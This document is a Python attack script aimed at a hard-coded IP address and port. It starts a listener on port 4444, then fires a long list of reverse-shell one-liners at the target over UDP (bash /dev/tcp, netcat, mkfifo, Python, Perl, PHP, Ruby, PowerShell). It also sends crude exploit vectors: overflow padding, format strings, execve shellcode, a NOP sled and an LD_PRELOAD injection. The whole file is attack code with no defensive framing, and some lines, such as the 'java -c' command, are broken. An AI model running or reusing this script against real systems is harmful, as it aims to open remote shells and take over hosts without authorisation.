#!/usr/bin/env python3
import socket
import time
import threading
import os
import subprocess

def listen_for_shell(port):
    """Listen for incoming reverse shell connection"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))
        sock.listen(1)
        print(f"Listening for reverse shell on port {port}...")
        
        conn, addr = sock.accept()
        print(f"Connection from {addr}")
        
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(f"Received: {data.decode()}")
            
        conn.close()
        sock.close()
    except Exception as e:
        print(f"Listener error: {e}")

def send_reverse_shell_commands(host, port):
    """Send commands that might trigger reverse shell"""
    commands = [
        b"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        b"nc -e /bin/bash 127.0.0.1 4444",
        b"nc -e /bin/sh 127.0.0.1 4444", 
        b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f",
        b"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        b"perl -e 'use Socket;$i=\"127.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        b"php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        b"ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        b"java -c 'Runtime r=Runtime.getRuntime();Process p=r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'\");'",
        b"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    ]
    
    for cmd in commands:
        print(f"Sending command: {cmd}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(cmd, (host, port))
            sock.close()
            time.sleep(1)
        except Exception as e:
            print(f"Error sending command: {e}")

def try_exploit_vectors(host, port):
    """Try various exploit vectors"""
    vectors = [
        # Buffer overflow attempts
        b"A" * 1000,
        b"A" * 5000,
        b"A" * 10000,
        
        # Format string attempts
        b"%x%x%x%x%x%x%x%x",
        b"%n%n%n%n",
        b"%s%s%s%s",
        
        # Shellcode attempts
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
        
        # Return-to-libc attempts
        b"\x41\x41\x41\x41" * 100,
        
        # ROP chain attempts
        b"\x90" * 100 + b"\xcc" * 10,
        
        # Environment variable exploits
        b"PATH=/tmp:$PATH",
        b"LD_PRELOAD=/tmp/evil.so",
        
        # File descriptor exploits
        b"exec 5<>/dev/tcp/127.0.0.1/4444",
        b"exec 6<>/dev/udp/127.0.0.1/4444",
    ]
    
    for vector in vectors:
        print(f"Sending exploit vector: {vector[:50].hex()}...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(vector, (host, port))
            sock.close()
            time.sleep(0.5)
        except Exception as e:
            print(f"Error sending vector: {e}")

if __name__ == "__main__":
    host = "5.161.142.77"
    port = 10155
    
    print(f"Reverse shell exploitation attempt against {host}:{port}")
    print("=" * 60)
    
    # Start listener in background
    listener_thread = threading.Thread(target=listen_for_shell, args=(4444,))
    listener_thread.daemon = True
    listener_thread.start()
    
    time.sleep(2)
    
    # Try reverse shell commands
    print("Attempting reverse shell commands...")
    send_reverse_shell_commands(host, port)
    
    print("\nAttempting exploit vectors...")
    try_exploit_vectors(host, port)
    
    print("\nWaiting for potential connections...")
    time.sleep(10)
    
    print("Reverse shell attempt completed!")